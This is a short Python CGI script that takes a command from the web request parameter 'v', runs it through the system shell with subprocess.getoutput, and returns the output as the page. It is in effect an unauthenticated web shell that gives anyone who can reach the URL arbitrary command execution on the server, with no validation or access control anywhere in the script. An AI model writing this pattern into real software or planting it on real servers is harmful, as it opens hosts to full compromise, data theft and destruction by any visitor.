#!/usr/bin/python3

import cgi
import subprocess as sbp

print("content-type : text/html")
print()

form_values = cgi.FieldStorage()
cmd = form_values.getvalue("v")
process_output = sbp.getoutput(cmd)

print(process_output)









